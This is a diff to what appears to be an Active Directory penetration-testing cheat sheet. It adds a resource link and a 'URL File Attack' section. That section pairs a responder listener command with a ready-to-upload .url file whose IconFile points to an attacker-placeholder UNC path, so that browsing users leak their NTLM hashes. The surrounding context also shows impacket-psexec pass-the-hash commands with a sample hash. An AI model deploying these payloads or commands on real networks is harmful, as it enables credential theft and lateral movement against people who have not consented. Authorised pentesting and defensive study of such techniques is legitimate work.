@@ -12,6 +12,8 @@ https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet
 
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md
 
+https://wadcoms.github.io/
+
 a lot about the AD pentest explanations
 
 https://www.youtube.com/channel/UCpoyhjwNIWZmsiKNKpsMAQQ
@@ -708,6 +710,26 @@ We can also reuse the same hash.
 impacket-psexec "Administrator":@10.10.10.10 -hashes ":8846f7eaee8fb117ad06bdd830b7586c"
 # reuse
 impacket-psexec "Administrator":@10.10.10.11 -hashes ":8846f7eaee8fb117ad06bdd830b7586c"
+```
+
+### :open_file_folder: URL File Attack
+
+https://www.hackingloops.com/url-file-attack-and-printnightmare/
+
+Add the symbol "@" or "~" at the beginning of the file name, and the file extension is "url".
+
+```shell
+sudo responder -I tun0 -A -v
+```
+
+Upload our payload `@test.url` to a possible path.
+
+```
+[InternetShortcut]
+URL=anything
+WorkingDirectory=anything
+IconFile=\\<attacker ip>\%USERNAME%.icon
+IconIndex=1
 ```
 
 ### :open_file_folder: Vulnerabilities
